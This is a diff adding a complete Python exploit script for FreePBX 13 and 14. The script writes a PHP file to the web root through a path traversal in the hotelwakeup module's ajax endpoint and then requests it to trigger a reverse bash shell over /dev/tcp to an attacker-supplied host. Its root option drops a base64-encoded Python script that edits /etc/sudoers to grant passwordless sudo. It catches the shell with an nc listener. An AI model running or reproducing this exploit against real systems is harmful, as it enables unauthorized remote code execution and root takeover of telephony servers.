@@ -1,0 +1,112 @@
+#!/usr/bin/env python
+'''
+    Title          |  FreePBX 13 Remote Command Execution and Privilege Escalation
+    Date           |  10/21/2016
+    Author         |  Christopher Davis 
+    Vendor         |  https://www.freepbx.org/
+    Version        |  FreePBX 13 & 14 (System Recordings Module versions: 13.0.1beta1 - 13.0.26)
+    Tested on      |  http://downloads.freepbxdistro.org/ISO/FreePBX-64bit-10.13.66.iso 
+				      http://downloads.freepbxdistro.org/ISO/FreePBX-32bit-10.13.66.iso
+    Purpose        |  This script exploits the freepbx website, elevates privileges and returns a reverse bind tcp as root
+    Usage          |  python pbx.py -u http://10.2.2.109 -l 10.2.2.115 -p 4444 -s r
+	Orig Author    |  pgt - nullsecurity.net 
+'''
+import re
+import subprocess
+import argparse
+import random
+import time
+import socket
+import threading
+
+#This portion will check for requests and prompt user to install it if not already
+try:
+    import requests
+except:
+    try:
+        while True:
+            choice = raw_input('Requests library not found but is needed. Install? \'Y\'es or \'N\'o?\n:')
+            if choice.lower() == 'y':
+                subprocess.call('pip install requests',shell=True)
+                import requests
+                break
+            elif choice.lower() == 'n':
+                exit()
+            else:
+                continue
+    except Exception as e:
+        print(e)
+        exit()
+
+#Since subprocess.call will bind, we start this thread sepparate to execute after our netcat bind
+def delayGet():
+	global args
+	try:
+		time.sleep(5)
+		requests.get(args.url+ '0x4148.php.call', verify=False)
+	except:
+		pass
+
+if __name__ == '__main__':
+	try:
+		parser = argparse.ArgumentParser()
+		parser.add_argument('-u', type=str, help='hostname and path. Ex- http://192.168.1.1/path/', dest='url')
+		parser.add_argument('-l', type=str, help='localhost ip to listen on', dest='lhost')
+		parser.add_argument('-p', type=str, help='port to listen on', dest='lport')
+		parser.add_argument('-s', type=str, help="'L'ocal or 'R'oot shell attempt", dest='shell')
+		parser.add_help
+		args = parser.parse_args()
+
+		#Make sure args were passed
+		if args.url == None or args.lhost == None or args.lport == None or not bool(re.search(r'^(?:[L|l]|[r|R])$', args.shell)):
+			parser.print_help()
+			print("\nUsage:  python freepbx.py -u http://10.2.2.109 -l 10.2.2.115 -p 4444")
+			exit()
+
+		#Make sure the http url is there
+		if bool(re.search('[hH][tT][tT][pP][sS]?\:\/\/', args.url)) == False:
+			print('There is something wrong with your url. It needs to have http:// or https://\n\n')
+			exit()
+
+		#make sure / is there, if not, put it there
+		if args.url[-1:] != '/':
+			args.url += '/'
+		#python -c 'import pty; pty.spawn("/bin/sh")'
+		#this is the php we will upload to get a reverse shell. System call to perform reverse bash shell. Nohup spawns a new process in case php dies
+
+		#if version 13, lets try to get root, otherwise
+		if args.shell.upper() == 'R':
+			cmdshell = '<?php fwrite(fopen("hackerWAShere.py","w+"),base64_decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHRpbWUNCiMgLSotIGNvZGluZzogdXRmLTggLSotIA0KY21kID0gJ3NlZCAtaSBcJ3MvQ29tIEluYy4vQ29tIEluYy5cXG5lY2hvICJhc3RlcmlzayBBTEw9XChBTExcKVwgICcgXA0KCSdOT1BBU1NXRFw6QUxMIlw+XD5cL2V0Y1wvc3Vkb2Vycy9nXCcgL3Zhci9saWIvJyBcDQoJJ2FzdGVyaXNrL2Jpbi9mcmVlcGJ4X2VuZ2luZScNCnN1YnByb2Nlc3MuY2FsbChjbWQsIHNoZWxsPVRydWUpDQpzdWJwcm9jZXNzLmNhbGwoJ2VjaG8gYSA+IC92YXIvc3Bvb2wvYXN0ZXJpc2svc3lzYWRtaW4vYW1wb3J0YWxfcmVzdGFydCcsIHNoZWxsPVRydWUpDQp0aW1lLnNsZWVwKDIwKQ==")); system("python hackerWAShere.py; nohup sudo bash -i >& /dev/tcp/'+args.lhost+'/'+args.lport+' 0>&1 ");?>'
+		else:
+			cmdshell = "<?php system('nohup bash -i >& /dev/tcp/"+args.lhost+"/"+args.lport+" 0>&1 ');?>"
+		
+		#creates a session
+		session = requests.Session()
+		print('\nStarting Session')
+		session.get(args.url, verify=False)
+		print('\nScraping the site for a cookie')
+		HEADERS = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0", "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', "Accept-Language":"en-US,en;q=0.5","Referer": args.url + 'admin/ajax.php', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
+		print('\nPosting evil php')
+		postData = {'module':'hotelwakeup','command':'savecall','day':'now','time':'+1 week','destination':"/../../../../../../var/www/html/0x4148.php","language":cmdshell}
+		result = session.post(args.url + 'admin/ajax.php', headers=HEADERS, data=postData, verify=False)
+		if 'Whoops' not in result.text:
+			print(result.text)
+			print('\nSomething Went wrong. Was expecting a Whoops but none found.')
+			exit()
+		#calls the get thread which will execute 5 seconds after the netcat bind
+
+		print('\nStarting new thread for getting evil php')
+		z = threading.Thread(target=delayGet)
+		z.daemon = True
+		z.start()
+
+		print('\nBinding to socket '+ args.lport + ' Please wait... May take 30 secs to get call back.\n')
+		#This binds our terminal with netcat and waits for the call back
+		try:
+			subprocess.call('nc -nvlp '+args.lport, shell=True)
+		except Exception as e:
+			print(e)
+		print('\nIf you saw the message "sudo: no tty present and no askpass program specified", please try again and it may work.')
+	except Exception as e:
+		print(e)
+		print('\nSee above error')
